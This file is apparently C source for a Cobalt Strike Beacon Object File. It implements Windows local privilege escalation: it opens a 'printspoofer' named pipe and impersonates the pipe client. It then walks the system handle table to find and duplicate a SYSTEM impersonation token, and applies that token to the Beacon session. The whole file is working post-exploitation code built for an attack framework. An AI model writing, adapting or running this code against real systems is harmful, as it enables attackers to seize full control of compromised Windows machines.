#include <windows.h> 
#include "beacon.h"
#include "def.h"

#define PIPE_NAME "printspoofer"

LPCSTR g_clientName = "\\\\localhost\\pipe\\" PIPE_NAME;
LPCSTR g_serverName = "\\\\.\\pipe\\" PIPE_NAME;

void go(LPSTR args, INT alen) {
   HANDLE serverHandle = KERNEL32$CreateNamedPipeA(g_serverName, FILE_FLAG_FIRST_PIPE_INSTANCE | PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 1, 0, 0, NMPWAIT_USE_DEFAULT_WAIT, NULL);
    if (serverHandle == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "CreateNamedPipeA: %d\n", KERNEL32$GetLastError());
        return;
    }

   HANDLE clientHandle = KERNEL32$CreateFileA(g_clientName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
   if (clientHandle == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "CreateFileA: %d\n", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(serverHandle);
        return;
    }

    BOOL connected = KERNEL32$ConnectNamedPipe(serverHandle, NULL);
    if (!connected && KERNEL32$GetLastError() != ERROR_PIPE_CONNECTED) {
        BeaconPrintf(CALLBACK_ERROR, "ConnectNamedPipe: %d\n", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(clientHandle);
        KERNEL32$CloseHandle(serverHandle);
        return;
    }

    BOOL impersonated = ADVAPI32$ImpersonateNamedPipeClient(serverHandle);
    if (!impersonated) {
        BeaconPrintf(CALLBACK_ERROR, "ImpersonateNamedPipeClient: %d\n", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(clientHandle);
        KERNEL32$CloseHandle(serverHandle);
        return;
    }

    DWORD len = sizeof(SYSTEM_HANDLE_INFORMATION) * 0x1000;
    PSYSTEM_HANDLE_INFORMATION shi = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, len);

    while (!NT_SUCCESS(NTDLL$NtQuerySystemInformation(SystemHandleInformation, shi, len, NULL))) {
        len += (sizeof(SYSTEM_HANDLE_INFORMATION) * 0x1000);
        shi = KERNEL32$HeapReAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, shi, len);
    }

    for (int i = 0; i < shi->NumberOfHandles; i++) {
        CLIENT_ID cid = {0};
        OBJECT_ATTRIBUTES att = {0};
        cid.UniqueProcess = (HANDLE)shi->Handles[i].UniqueProcessId;

        InitializeObjectAttributes(&att, NULL, OBJ_CASE_INSENSITIVE, 0, 0);

        HANDLE processHandle;
        if (!NT_SUCCESS(NTDLL$NtOpenProcess(&processHandle, PROCESS_DUP_HANDLE, &att, &cid))) {
            continue;
        }

        HANDLE serverHandle = NULL;
        if (!NT_SUCCESS(NTDLL$NtDuplicateObject(processHandle, (HANDLE)shi->Handles[i].HandleValue, (HANDLE)-1, &serverHandle, 0, 0, DUPLICATE_SAME_ACCESS))) {
            KERNEL32$CloseHandle(processHandle);
            continue;
        }

        TOKEN_STATISTICS tst = {0};
        if (!NT_SUCCESS(NTDLL$NtQueryInformationToken(serverHandle, TokenStatistics, &tst, sizeof(tst), &len))) {
            KERNEL32$CloseHandle(processHandle);
            KERNEL32$CloseHandle(serverHandle);
            continue;
        }

        LUID uid = {0};
        uid.LowPart = 0x3E7; // SYSTEM
        uid.HighPart = 0;
        if (tst.AuthenticationId.LowPart != uid.LowPart || tst.AuthenticationId.HighPart != uid.HighPart || tst.PrivilegeCount < 22) {
            KERNEL32$CloseHandle(processHandle);
            KERNEL32$CloseHandle(serverHandle);
            continue;
        }

        TOKEN_TYPE typ = 0;
        if (!NT_SUCCESS(NTDLL$NtQueryInformationToken(serverHandle, TokenType, &typ, sizeof(typ), &len))) {
            KERNEL32$CloseHandle(processHandle);
            KERNEL32$CloseHandle(serverHandle);
            continue;
        }

        if (typ == TokenPrimary) {
            KERNEL32$CloseHandle(processHandle);
            KERNEL32$CloseHandle(serverHandle);
            continue;
        }

        HANDLE sys = NULL;
        if (NT_SUCCESS(NTDLL$NtDuplicateObject(processHandle, (HANDLE)shi->Handles[i].HandleValue, (HANDLE)-1, &sys, 0, 0, DUPLICATE_SAME_ACCESS))) {
            BeaconPrintf(CALLBACK_OUTPUT, "Success\n");
            BeaconUseToken(sys);
            KERNEL32$CloseHandle(sys);
            KERNEL32$CloseHandle(processHandle);
            KERNEL32$CloseHandle(serverHandle);
            KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, shi);
            return;
        } 
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Failure\n");

    if (shi != NULL) {
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, shi);
    }
    
    KERNEL32$CloseHandle(clientHandle);
    KERNEL32$CloseHandle(serverHandle);
}
